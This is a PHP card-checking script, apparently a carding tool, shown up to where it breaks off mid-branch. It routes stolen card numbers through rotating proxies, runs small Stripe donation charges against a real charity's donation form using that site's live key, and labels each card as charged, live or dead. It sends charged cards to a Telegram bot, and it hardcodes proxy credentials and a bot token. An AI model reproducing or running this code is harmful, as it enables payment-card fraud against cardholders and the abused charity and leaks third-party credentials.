<?php

  
require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
//$proxy ='pa-chicooked-US.ntnt.network:5959:QlNVitjc-cc-ccus-SID-35536742:pas0W6fi';
$idd = '1764351005';
//$lista = '4782002067617219|07|2025|273';
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


$hydra = $_GET['hydra'];
$ip = $_GET['ip'];
$proxy = ''.$ip.'';
$proxyauth = ''.$hydra.'';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);

$curl_scraped_page = curl_exec($ch);

curl_close($ch);

$curl_scraped_page;
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}



////////////////////////////===[Randomizing Details Api]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 
//pa-chicooked-US.ntnt.network:5959:QlNVitjc-cc-ccus-SID-35536742:pas0W6fi

$proxauth = array();
$proxauth [] = 'vqifyzur-rotate:nvgm7h6e9wgp'; //Some proxies require IP,port no.
$proxauth [] = 'vqifyzur-rotate:nvgm7h6e9wgp';
$proxyusr = $proxauth[array_rand($proxauth)];



$ch = curl_init();
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyusr);
curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
curl_setopt($ch, CURLOPT_URL, 'https://www.azbengal.org/donation/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /donation/ h2',
'Host: www.azbengal.org',
'cache-control: max-age=0',
'upgrade-insecure-requests: 1',
'origin: https://www.azbengal.org',
'content-type: multipart/form-data; boundary=----WebKitFormBoundarySKGPWq3q2cHft5yO',
'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'x-requested-with: com.xbrowser.play',
'sec-fetch-site: same-origin',
'sec-fetch-mode: navigate',
'sec-fetch-user: ?1',
'sec-fetch-dest: document',
'referer: https://www.azbengal.org/donation/',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
));
$r1 = curl_exec($ch);
$vh = trim(strip_tags(getStr($r1,'{"common":{"form":{"honeypot":{"version_hash":"','"'))); 
$gkey = trim(strip_tags(getStr($r1,"input type='hidden' class='gform_hidden' name='gform_unique_id' value='","'"))); 
$hdval = trim(strip_tags(getStr($r1,"<input type='hidden' class='gform_hidden' name='state_6' value='","'")));
$nonce = trim(strip_tags(getStr($r1,'"create_payment_intent_nonce":"','"'))); 

//echo $nonce;
////////////////////////////===[1ST CURL]
$ch = curl_init();
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyusr);
curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'x-requested-with: com.xbrowser.play',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',

));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
///&card[cvc]='.$cvv.'
////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Badbou&billing_details[address][postal_code]=90023&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=f760b15e-bab4-4824-9c74-73ad9684fe6bc93c7d&muid=e216cb05-dbb9-4c47-8ed0-77a83870842b52b19a&sid=880fbd04-8e30-4c23-8e8d-3f534b1eb22c630a1d&pasted_fields=number&payment_user_agent=stripe.js%2F3007153515%3B+stripe-js-v3%2F3007153515%3B+card-element&referrer=https%3A%2F%2Fwww.azbengal.org&time_on_page=107217&key=pk_live_51KYYJDIvITdPgOSeT9xDWU6aXG0fqjC4FtawCwCWMifUYr4INiifGwy4nxzb0xTO7HrPLzSfOozajfXxqXtUcvbc00x8u770F6');

 $result1 = curl_exec($ch);
  $l4 = trim(strip_tags(getStr($result1,'"last4": "','"')));
  $crt = trim(strip_tags(getStr($result1,'"created": "','"')));
  $brnd = trim(strip_tags(getStr($result1,'"brand": "','"')));
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
//$card = trim(strip_tags(getStr($result1,'"card": { "id": "','"')));
//echo $card;
$id;


$ch = curl_init();
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyusr);
curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
curl_setopt($ch, CURLOPT_URL, 'https://www.azbengal.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php h2',
'Host: www.azbengal.org',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.azbengal.org',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.azbengal.org/donation/',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'action=gfstripe_create_payment_intent&nonce='.$nonce.'&payment_method%5Bid%5D='.$id.'&payment_method%5Bobject%5D=payment_method&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcity%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline2%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bpostal_code%5D=90023&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bstate%5D=&payment_method%5Bbilling_details%5D%5Bemail%5D=&payment_method%5Bbilling_details%5D%5Bname%5D=Badbou&payment_method%5Bbilling_details%5D%5Bphone%5D=&payment_method%5Bcard%5D%5Bbrand%5D=visa&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_line1_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_postal_code_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Bcvc_check%5D=&payment_method%5Bcard%5D%5Bcountry%5D=US&payment_method%5Bcard%5D%5Bexp_month%5D='.$mes.'&payment_method%5Bcard%5D%5Bexp_year%5D='.$ano.'&payment_method%5Bcard%5D%5Bfunding%5D=debit&payment_method%5Bcard%5D%5Bgenerated_from%5D=&payment_method%5Bcard%5D%5Blast4%5D='.$l4.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bavailable%5D%5B%5D=visa&payment_method%5Bcard%5D%5Bnetworks%5D%5Bpreferred%5D=&payment_method%5Bcard%5D%5Bthree_d_secure_usage%5D%5Bsupported%5D=true&payment_method%5Bcard%5D%5Bwallet%5D=&payment_method%5Bcreated%5D='.$crt.'&payment_method%5Bcustomer%5D=&payment_method%5Blivemode%5D=true&payment_method%5Btype%5D=card&currency=USD&amount=70&feed_id=6');

$result2 = curl_exec($ch);
$pi = trim(strip_tags(getStr($result2,'"id":"','"')));
$scrt = trim(strip_tags(getStr($result2,'"client_secret":"','"')));
$ch = curl_init();
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyusr);
curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
curl_setopt($ch, CURLOPT_URL, 'https://www.azbengal.org/donation/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /donation/ h2',
'Host: www.azbengal.org',
'cache-control: max-age=0',
'upgrade-insecure-requests: 1',
'origin: https://www.azbengal.org',
'content-type: multipart/form-data; boundary=----WebKitFormBoundarySKGPWq3q2cHft5yO',
'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'x-requested-with: com.xbrowser.play',
'sec-fetch-site: same-origin',
'sec-fetch-mode: navigate',
'sec-fetch-user: ?1',
'sec-fetch-dest: document',
'referer: https://www.azbengal.org/donation/',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="input_1.3"

Badboy
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="input_1.6"

Chk
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="input_2"

badboychx1@gmail.com
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="input_3"

(304) 648-6468
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="input_7"

$0.70
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="input_6.5"

Badbou
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="is_submit_6"

1
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="gform_submit"

6
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="gform_unique_id"


------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="state_6"

WyJ7XCI4XCI6W1wiNTFjNDZmOWU4ZDEyMDE1NWQ5MDQwOGRkNzQ4OWQyN2RcIl19IiwiZDA2YTY0MmM3MDI2YzhjNjNjNDM0NzVhZjcxZjE3YTciXQ==
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="gform_target_page_number_6"

0
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="gform_source_page_number_6"

1
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="gform_field_values"


------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="pum_form_popup_id"

8663
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="stripe_response"

{"id":"'.$pi.'","client_secret":"'.$scrt.'","amount":70}
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="stripe_credit_card_last_four"

'.$l4.'
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="stripe_credit_card_type"

'.$brnd.'
------WebKitFormBoundarySKGPWq3q2cHft5yO--');

 $result3 = curl_exec($ch);


/////////// [Bin Lookup] /////////////

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);


if(strpos($fim, '"type":"credit"') !== false) {
    $type = 'Credit';
  } else {
    $type = 'Debit';
  }
  if
  (strpos($result3,  '"cvc_check": "pass"')) {
    echo   "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CVV LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  "Thank you for your donation of")) {
    echo  "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
            $msg = 
    "⛥CHARGE✅: ".$lista." 
    ⛥Result: Payment complete. <br>⛥by @badboychx\r\n";
    $apiToken = "5959454722:AAFnG4oZXQPKvdeIAsr5mjrsGaJR0CRZYJo";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
  }
  elseif
  (strpos($result3,  'result":"OK')) {
    echo "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  'recurring":true')) {
    echo "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  'Your card zip code is incorrect.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[APPROVED CVV]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  } 
  elseif
  (strpos($result3,  '/donations/thank_you?donation_number=','')) {
    echo "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  "incorrect_zip")) {
    echo"CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[APPROVED CVV]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  '"type":"one-time"')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[APPROVED CVV]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  'security code is incorrect.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  'security code is invalid.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INVALID CVC]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  'Your card&#039;s security code is incorrect.')) {
    echo"CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  "incorrect_cvc")) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->CCN LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  elseif
  (strpos($result3,  'Your card has insufficient funds.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  elseif
  (strpos($result3,  "insufficient_funds")) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  '"cvc_check": "fail"')) {
    echo  "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  'security code is invalid.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  'Your card&#039;s security code is incorrect.')) {
    echo"CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  "incorrect_cvc")) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  elseif
  (strpos($result3,  'Your card has insufficient funds.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  elseif
  (strpos($result3,  "insufficient_funds")) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  'Your card has expired.')) {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card has expired.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  'Your card number is incorrect.')) {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card number is incorrect.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  elseif
  (strpos($result3,  "incorrect_number")) {
